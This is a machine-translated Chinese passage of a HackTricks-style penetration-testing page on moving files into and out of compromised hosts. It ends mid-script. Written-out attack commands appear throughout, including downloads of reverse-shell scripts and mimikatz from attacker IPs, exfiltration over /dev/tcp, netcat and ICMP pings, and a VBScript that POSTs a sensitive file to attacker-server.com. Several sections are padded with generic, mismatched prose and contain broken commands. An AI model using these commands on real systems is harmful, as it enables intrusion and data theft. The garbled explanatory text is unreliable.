# 渗透

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快地修复它们。Intruder 跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从 API 到 Web 应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 常见的白名单域名用于信息泄露

查看 [https://lots-project.com/](https://lots-project.com/) 以找到常见的白名单域名，可以被滥用

## 复制并粘贴 Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

Windows是一种广泛使用的操作系统，因此在渗透测试中，了解如何从Windows系统中窃取数据是非常重要的。以下是一些常见的Windows数据窃取方法和资源。

## 内部数据窃取

### 剪贴板窃取

剪贴板窃取是一种常见的数据窃取方法，攻击者可以通过监视剪贴板内容来获取用户复制的敏感信息。这可以通过恶意软件或恶意脚本来实现。

### 键盘记录器

键盘记录器是一种记录用户按键的工具，攻击者可以使用它来获取用户输入的敏感信息，例如用户名、密码等。键盘记录器可以是硬件设备或恶意软件。

### 进程注入

进程注入是一种将恶意代码注入到正在运行的进程中的技术。攻击者可以使用进程注入来窃取进程中的敏感数据，例如登录凭据、会话令牌等。

## 网络数据窃取

### 网络监听

网络监听是一种监视网络流量的技术，攻击者可以使用它来捕获传输的数据包。这可以通过使用网络分析工具、嗅探器或恶意软件来实现。

### 远程访问工具

远程访问工具是一种允许攻击者远程控制受感染系统的工具。攻击者可以使用远程访问工具来窃取系统中的敏感数据。

### 数据包嗅探

数据包嗅探是一种监视网络流量的技术，攻击者可以使用它来捕获传输的数据包。这可以通过使用网络分析工具、嗅探器或恶意软件来实现。

## 存储介质数据窃取

### 可移动存储设备

攻击者可以使用可移动存储设备（如USB闪存驱动器）来窃取数据。他们可以将恶意软件或恶意脚本放置在可移动存储设备上，当用户插入设备时，恶意软件将自动运行并窃取数据。

### 云存储

云存储是一种将数据存储在云中的技术，攻击者可以通过访问受感染系统上的云存储账户来窃取数据。这可以通过获取云存储账户的凭据或利用弱密码来实现。

以上是一些常见的Windows数据窃取方法和资源。在渗透测试中，了解这些方法和资源可以帮助攻击者更好地理解和利用Windows系统中的漏洞。
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

Windows是一种广泛使用的操作系统，因此在渗透测试中，了解如何从Windows系统中窃取数据是至关重要的。以下是一些常见的Windows数据窃取方法和资源。

## 内部网络数据窃取

### 内部网络扫描

在Windows系统中，可以使用工具如Nmap、Masscan和Zmap等进行内部网络扫描，以发现其他主机和开放端口。这些工具可以帮助渗透测试人员识别潜在的目标和漏洞。

### 端口转发和隧道

端口转发和隧道技术可以帮助渗透测试人员在内部网络中建立通信通道，以便从受限制的系统中窃取数据。常用的工具包括Plink、Socat和Meterpreter等。

### 数据包嗅探

数据包嗅探是一种监视网络流量的技术，可以用于捕获敏感数据。在Windows系统中，可以使用工具如Wireshark、Tcpdump和WinPcap等进行数据包嗅探。

### 远程桌面协议（RDP）

远程桌面协议（RDP）是Windows系统中常用的远程访问协议。渗透测试人员可以使用工具如RDP Wrapper和FreeRDP等来窃取通过RDP传输的数据。

## 云和SaaS数据窃取

### 云存储和文件共享

云存储和文件共享平台（如Google Drive、Dropbox和OneDrive）是常见的数据存储和共享方式。渗透测试人员可以使用工具如rclone、gdrive和dropbox_uploader等来窃取云存储和文件共享平台上的数据。

### 电子邮件和消息平台

电子邮件和消息平台（如Gmail、Outlook和Slack）是常见的通信方式。渗透测试人员可以使用工具如IMAPClient、Outlook Redemption和Slack API等来窃取电子邮件和消息平台上的数据。

### 云数据库和数据仓库

云数据库和数据仓库（如Amazon RDS、Google Cloud SQL和Azure SQL Database）存储了大量的敏感数据。渗透测试人员可以使用工具如SQLMap、NoSQLMap和AWS CLI等来窃取云数据库和数据仓库中的数据。

### Web应用程序和API

Web应用程序和API是常见的数据交互方式。渗透测试人员可以使用工具如Burp Suite、Postman和OWASP ZAP等来窃取Web应用程序和API中的数据。

## 物理设备数据窃取

### 可移动存储设备

可移动存储设备（如USB闪存驱动器和外部硬盘）是常见的数据存储方式。渗透测试人员可以使用工具如USB Rubber Ducky和BadUSB等来窃取可移动存储设备中的数据。

### 网络设备

网络设备（如路由器和交换机）存储了大量的网络配置和日志数据。渗透测试人员可以使用工具如Telnet、SSH和SNMP等来窃取网络设备中的数据。

以上是一些常见的Windows数据窃取方法和资源，渗透测试人员可以根据具体情况选择合适的方法来窃取目标系统中的数据。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### 上传文件

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer 打印 GET 和 POST 请求（包括头部信息）**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python 模块 [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS服务器**

An HTTPS server is a type of server that uses the HTTPS (Hypertext Transfer Protocol Secure) protocol to secure the communication between the server and the client. HTTPS is an extension of the HTTP protocol that adds encryption and authentication mechanisms to ensure the confidentiality and integrity of the data being transmitted.

To set up an HTTPS server, you need to obtain an SSL/TLS certificate from a trusted certificate authority (CA). This certificate is used to verify the identity of the server and establish a secure connection with the client. Once the certificate is obtained, it needs to be installed on the server.

There are several popular web servers that support HTTPS, such as Apache, Nginx, and Microsoft IIS. These servers provide configuration options to enable HTTPS and specify the location of the SSL/TLS certificate.

When a client connects to an HTTPS server, the server presents its SSL/TLS certificate to the client. The client verifies the certificate to ensure it is valid and trusted. If the certificate is valid, the client and server establish a secure connection using encryption algorithms such as SSL or TLS. This ensures that the data transmitted between the client and server is encrypted and cannot be intercepted or tampered with by attackers.

Using an HTTPS server is essential for protecting sensitive information, such as login credentials, credit card numbers, and personal data, from being intercepted by malicious actors. It is widely used in e-commerce websites, online banking platforms, and any other application that requires secure communication over the internet.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP服务器（Python）

```python
import ftplib

def ftp_upload(hostname, username, password, local_file, remote_file):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(username, password)
        ftp.storbinary('STOR ' + remote_file, open(local_file, 'rb'))
        ftp.quit()
        print("File uploaded successfully.")
    except ftplib.all_errors as e:
        print("Error uploading file:", e)

def ftp_download(hostname, username, password, remote_file, local_file):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(username, password)
        ftp.retrbinary('RETR ' + remote_file, open(local_file, 'wb').write)
        ftp.quit()
        print("File downloaded successfully.")
    except ftplib.all_errors as e:
        print("Error downloading file:", e)
```

### FTP上传

```python
import ftplib

def ftp_upload(hostname, username, password, local_file, remote_file):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(username, password)
        ftp.storbinary('STOR ' + remote_file, open(local_file, 'rb'))
        ftp.quit()
        print("文件上传成功。")
    except ftplib.all_errors as e:
        print("上传文件时出错：", e)
```

### FTP下载

```python
import ftplib

def ftp_download(hostname, username, password, remote_file, local_file):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(username, password)
        ftp.retrbinary('RETR ' + remote_file, open(local_file, 'wb').write)
        ftp.quit()
        print("文件下载成功。")
    except ftplib.all_errors as e:
        print("下载文件时出错：", e)
```
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP服务器（NodeJS）

The FTP server is a popular method for transferring files between a client and a server over a network. It is widely used in various industries for its simplicity and efficiency. In this section, we will explore how to set up an FTP server using NodeJS.

#### Setting up the FTP server

To set up an FTP server using NodeJS, we need to install the `ftp-srv` package. This package provides a simple and easy-to-use API for creating an FTP server.

```javascript
const ftpsrv = require('ftp-srv');

const server = new ftpsrv('ftp://localhost:21', {
  anonymous: true,
  greeting: 'Welcome to the FTP server',
});

server.on('login', ({connection, username, password}, resolve, reject) => {
  if (username === 'anonymous' && password === '') {
    resolve({root: '/path/to/ftp/root'});
  } else {
    reject(new Error('Invalid username or password'));
  }
});

server.listen()
  .then(() => {
    console.log('FTP server started');
  })
  .catch((err) => {
    console.error('Error starting FTP server:', err);
  });
```

In the above code, we create a new FTP server instance using the `ftp-srv` package. We specify the server URL (`ftp://localhost:21`) and set the `anonymous` option to `true` to allow anonymous access. We also provide a greeting message to be displayed when a client connects to the server.

Next, we listen for the `login` event, which is triggered when a client attempts to log in to the server. In the event handler, we check if the provided username and password match the anonymous credentials. If they do, we resolve the login request and specify the root directory for the FTP server. If the credentials are invalid, we reject the login request with an error.

Finally, we start the FTP server by calling the `listen` method. If the server starts successfully, we log a success message to the console. If an error occurs during startup, we log an error message.

#### Connecting to the FTP server

To connect to the FTP server, clients can use any FTP client software, such as FileZilla or WinSCP. They need to provide the server URL (`ftp://localhost:21`) and can choose to log in anonymously or with valid credentials.

Once connected, clients can perform various operations, such as uploading and downloading files, creating directories, and deleting files. The FTP server handles these operations and ensures the proper transfer of data between the client and the server.

#### Conclusion

Setting up an FTP server using NodeJS is a straightforward process with the help of the `ftp-srv` package. By following the steps outlined in this section, you can create your own FTP server and facilitate file transfers between clients and servers.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP服务器（pure-ftp）

FTP服务器是一种常见的文件传输协议，用于在网络上传输文件。Pure-FTP是一种流行的FTP服务器软件，提供了安全和可靠的文件传输功能。

#### 概述

攻击者可以利用FTP服务器进行数据泄露。以下是一些常见的攻击方法：

1. **暴力破解密码**：攻击者可以使用暴力破解工具尝试猜解FTP服务器的密码。他们可以使用常见的密码字典或自定义的密码列表进行尝试。

2. **嗅探FTP流量**：攻击者可以使用网络嗅探工具来捕获经过FTP服务器的流量。通过分析流量，他们可以获取敏感信息，如用户名、密码和传输的文件。

3. **利用弱密码**：如果FTP服务器使用弱密码保护，攻击者可以轻松地猜解密码并获取访问权限。

4. **利用软件漏洞**：攻击者可以利用FTP服务器软件中的漏洞来获取未经授权的访问权限。他们可以使用已知的漏洞或自己发现的新漏洞。

#### 防御措施

为了保护FTP服务器免受攻击，以下是一些推荐的防御措施：

1. **使用强密码**：确保FTP服务器的密码是强密码，包含字母、数字和特殊字符，并且长度足够长。

2. **限制登录尝试**：设置FTP服务器以限制登录尝试次数，并在一定次数的失败尝试后锁定账户。

3. **加密传输**：使用安全的传输协议，如FTPS（FTP over SSL/TLS）或SFTP（SSH File Transfer Protocol），以加密FTP流量。

4. **定期更新软件**：及时更新FTP服务器软件以修复已知的漏洞，并确保使用最新的安全补丁。

5. **监控日志**：定期检查FTP服务器的日志文件，以便及时发现异常活动和潜在的攻击。

6. **网络分段**：将FTP服务器放置在独立的网络段中，并使用防火墙限制对FTP服务器的访问。

7. **访问控制**：根据需要限制FTP服务器的访问权限，并仅允许授权用户进行文件传输。

通过采取这些防御措施，可以增强FTP服务器的安全性，并减少数据泄露的风险。
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** 客户端

在进行渗透测试期间，从目标系统中窃取敏感数据是一个重要的任务。这个过程被称为数据泄露。在 Windows 客户端上，有几种常见的方法可以实现数据泄露。

#### **剪贴板**

剪贴板是一个用于复制和粘贴文本、图像和其他数据的临时存储区域。通过监视剪贴板，可以捕获用户复制到剪贴板的敏感数据。这可以通过使用键盘记录器或特定的恶意软件来实现。

#### **网络流量**

通过监视网络流量，可以捕获从 Windows 客户端发送到外部服务器的数据。这可以通过使用网络嗅探工具来实现，例如 Wireshark。

#### **文件传输**

通过将敏感数据保存在文件中，然后将文件传输到外部服务器，可以实现数据泄露。这可以通过使用文件传输协议（如 FTP、SFTP 或 SCP）或云存储服务（如 Dropbox 或 Google Drive）来实现。

#### **邮件**

通过将敏感数据作为附件发送到外部电子邮件地址，可以实现数据泄露。这可以通过使用电子邮件客户端或脚本来实现。

#### **远程访问**

通过远程访问 Windows 客户端，可以直接从目标系统中提取敏感数据。这可以通过使用远程桌面协议（RDP）或虚拟专用网络（VPN）来实现。

#### **社交工程**

通过欺骗用户，诱使其主动泄露敏感数据，这被称为社交工程。这可以通过使用钓鱼网站、恶意软件或社交工程工具来实现。

#### **其他资源**

除了上述方法之外，还有其他一些资源可以用于实现数据泄露，例如使用 USB 设备、打印机或其他外部存储设备。这些方法通常需要物理访问目标系统。

在进行数据泄露时，务必遵守法律和道德准则，并确保获得适当的授权。
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali作为服务器
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
或者使用Samba创建一个SMB共享：
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# 数据外泄

在渗透测试过程中，数据外泄是一个重要的目标。数据外泄是指将敏感信息从目标系统中提取并传输到攻击者控制的位置。这些敏感信息可能包括用户凭据、机密文件、数据库内容等。

## 常见的数据外泄方法

以下是一些常见的数据外泄方法：

1. **文件传输**：攻击者可以使用各种方法将目标系统中的文件传输到自己的位置。这可以通过使用文件传输协议（如FTP、SFTP）或使用云存储服务（如Dropbox、Google Drive）来实现。

2. **邮件外泄**：攻击者可以将敏感信息发送到自己的电子邮件地址。这可以通过利用目标系统上的电子邮件客户端或使用命令行工具（如sendmail）来实现。

3. **远程访问**：攻击者可以通过远程访问协议（如RDP、SSH）连接到目标系统，并从中提取敏感信息。

4. **数据编码**：攻击者可以将敏感信息编码为不可读的格式，以避免被检测。这可以通过使用Base64编码或自定义编码算法来实现。

5. **隐蔽通道**：攻击者可以利用目标系统上的隐蔽通道来传输敏感信息。这可以包括使用DNS隐蔽通道、隐蔽在图像或音频文件中的数据等。

## 数据外泄工具和资源

以下是一些常用的数据外泄工具和资源：

- **文件传输工具**：例如`wget`、`curl`、`scp`等，用于在命令行中传输文件。

- **邮件客户端**：例如Microsoft Outlook、Mozilla Thunderbird等，用于发送和接收电子邮件。

- **编码工具**：例如Base64编码器/解码器，用于将数据编码为Base64格式。

- **隐蔽通道工具**：例如`dnscat2`、`steghide`等，用于利用隐蔽通道传输数据。

- **云存储服务**：例如Dropbox、Google Drive等，用于在云端存储和传输文件。

- **远程访问工具**：例如RDP客户端、SSH客户端等，用于远程连接到目标系统。

以上是一些常见的数据外泄方法和工具，攻击者可以根据具体情况选择合适的方法来实现数据外泄。
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

攻击者必须运行SSHd。
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

如果受害者拥有SSH，攻击者可以将受害者的目录挂载到攻击者的计算机上。
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC（Netcat）是一种功能强大的网络工具，可用于在网络上进行数据传输和端口扫描。它可以作为客户端或服务器使用，并支持多种协议和功能。以下是一些常见的使用场景和方法：

### 数据传输

使用NC可以在网络上传输数据。以下是一些常见的方法：

- 使用TCP协议传输数据：`nc <目标IP> <目标端口> < 文件名`
- 使用UDP协议传输数据：`nc -u <目标IP> <目标端口> < 文件名`
- 使用反向连接传输数据：`nc -l -p <本地端口> > 文件名`

### 端口扫描

NC还可以用于进行端口扫描，以检测目标主机上开放的端口。以下是一些常见的方法：

- 扫描单个端口：`nc -z <目标IP> <目标端口>`
- 扫描一系列端口：`nc -z <目标IP> <起始端口>-<结束端口>`
- 扫描常见端口：`nc -z <目标IP> 1-1024`

### 其他功能

除了数据传输和端口扫描，NC还具有其他一些功能：

- 创建一个简单的聊天服务器：`nc -l -p <本地端口>`
- 远程执行命令：`nc <目标IP> <目标端口> -e /bin/bash`
- 文件传输：`nc -l -p <本地端口> > 文件名` 和 `nc <目标IP> <目标端口> < 文件名`

NC是一种非常灵活和强大的工具，可以在渗透测试和网络安全评估中发挥重要作用。熟练掌握NC的使用方法，可以帮助黑客更好地执行各种任务。
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
```bash
cat /path/to/file > /dev/tcp/<attacker_ip>/<attacker_port>
```

使用`/dev/tcp`设备节点从受害者下载文件。

```bash
cat /path/to/file > /dev/tcp/<攻击者IP>/<攻击者端口>
```

### Upload file to victim
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### 将文件上传到受害者计算机

To exfiltrate data from a victim's computer, one common method is to upload a file to their system. This allows the attacker to transfer sensitive information or malware to the victim's machine.

There are several techniques that can be used to accomplish this:

1. **Web-based file upload**: Exploiting vulnerabilities in web applications that allow file uploads can be an effective way to exfiltrate data. By uploading a malicious file, the attacker can gain access to the victim's system.

2. **Email attachments**: Sending an email with a malicious attachment to the victim can also be used to upload a file. Once the victim opens the attachment, the file is uploaded to their computer.

3. **File transfer protocols**: Utilizing file transfer protocols such as FTP (File Transfer Protocol) or SFTP (Secure File Transfer Protocol) can enable the attacker to upload files to the victim's machine.

4. **Cloud storage services**: Leveraging cloud storage services like Dropbox, Google Drive, or OneDrive can provide a convenient way to upload files to the victim's computer. By tricking the victim into syncing their cloud storage, the attacker can gain access to the uploaded files.

It is important for attackers to choose the most suitable method based on the target's environment and vulnerabilities. Additionally, taking precautions to avoid detection, such as encrypting the uploaded files or disguising them as harmless documents, can increase the chances of a successful exfiltration.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
感谢 **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

如果您可以将数据发送到SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

默认情况下，在XP和2003中（在其他系统中需要在安装过程中显式添加）

在Kali中，**启动TFTP服务器**：
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Python中的TFTP服务器：**

```python
import socket
import struct

def tftp_server():
    # 创建UDP套接字
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        # 接收客户端请求
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:
            # 处理读请求
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # 读取文件内容
            try:
                with open(filename, 'rb') as file:
                    file_data = file.read()
            except FileNotFoundError:
                error_packet = struct.pack('!HH', 5, 1) + b'File not found'
                server_socket.sendto(error_packet, client_address)
                continue

            # 发送文件内容
            block_number = 1
            start_index = 0
            while start_index < len(file_data):
                end_index = start_index + 512
                data_packet = struct.pack('!HH', 3, block_number) + file_data[start_index:end_index]
                server_socket.sendto(data_packet, client_address)

                # 等待ACK
                ack_packet, _ = server_socket.recvfrom(4)
                ack_block_number = struct.unpack('!HH', ack_packet[:4])[1]

                if ack_block_number == block_number:
                    block_number += 1
                    start_index = end_index
                else:
                    break

        elif opcode == 2:
            # 处理写请求
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # 接收文件内容
            file_data = b''
            block_number = 0
            while True:
                # 等待数据包
                data_packet, _ = server_socket.recvfrom(516)
                received_block_number = struct.unpack('!HH', data_packet[:4])[1]

                if received_block_number == block_number + 1:
                    block_number += 1
                    file_data += data_packet[4:]
                    ack_packet = struct.pack('!HH', 4, block_number)
                    server_socket.sendto(ack_packet, client_address)

                    if len(data_packet) < 516:
                        break
                else:
                    break

            # 写入文件内容
            try:
                with open(filename, 'wb') as file:
                    file.write(file_data)
            except:
                error_packet = struct.pack('!HH', 5, 2) + b'Error writing file'
                server_socket.sendto(error_packet, client_address)
                continue

        else:
            # 不支持的操作码
            error_packet = struct.pack('!HH', 5, 4) + b'Unsupported operation'
            server_socket.sendto(error_packet, client_address)

    server_socket.close()

if __name__ == '__main__':
    tftp_server()
```
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
在**受害者**中，连接到Kali服务器：
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

使用 PHP 一行代码下载文件：
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript（Visual Basic Scripting Edition）是一种基于Visual Basic的脚本语言，常用于Windows操作系统上的自动化任务和脚本编写。VBScript可以通过多种方式进行数据泄露，包括以下几种常见的方法：

### 1. 文件传输

使用VBScript可以通过文件传输将敏感数据从目标系统传送到攻击者控制的服务器。这可以通过使用`FileSystemObject`对象来读取和写入文件来实现。攻击者可以编写VBScript脚本来遍历目标系统上的文件和目录，并将敏感数据复制到指定的位置。

```vbscript
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("C:\sensitive_data.txt", 1)
strData = objFile.ReadAll
objFile.Close

Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.Open "POST", "http://attacker-server.com/receive.php", False
objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.send "data=" & strData
```

### 2. 网络传输

VBScript可以使用网络传输协议（如HTTP、FTP）将数据发送到远程服务器。攻击者可以编写VBScript脚本来将敏感数据作为POST或GET请求发送到指定的URL。

```vbscript
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.Open "POST", "http://attacker-server.com/receive.php", False
objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.send "data=sensitive_data"
```

### 3. 电子邮件传输

VBScript可以使用SMTP协议将数据作为电子邮件附件发送到指定的邮箱。攻击者可以编写VBScript脚本来创建电子邮件，并将敏感数据作为附件添加到邮件中。

```vbscript
Set objMessage = CreateObject("CDO.Message")
objMessage.Subject = "Sensitive Data"
objMessage.From = "attacker@attacker-server.com"
objMessage.To = "victim@victim-domain.com"
objMessage.TextBody = "Please find the attached sensitive data."
objMessage.AddAttachment "C:\sensitive_data.txt"
objMessage.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objMessage.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.attacker-server.com"
objMessage.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objMessage.Configuration.Fields.Update
objMessage.Send
```

以上是VBScript中常用的数据泄露方法，攻击者可以根据具体情况选择适合的方法来实施数据泄露攻击。
```bash
Attacker> python -m SimpleHTTPServer 80
```
**受害者**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
